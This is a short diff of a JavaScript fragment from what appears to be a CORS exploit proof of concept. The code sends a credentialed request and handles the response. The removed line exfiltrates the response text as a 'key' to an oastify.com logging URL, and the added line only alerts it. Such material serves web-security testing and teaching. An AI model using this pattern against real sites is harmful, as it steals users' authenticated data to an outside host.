@@ -5,5 +5,5 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='//xijq341cj187wnjlxsm3irl6lxrofe33.oastify.com/log?key='+this.responseText; 
+    alert(this.responseText); 
 };
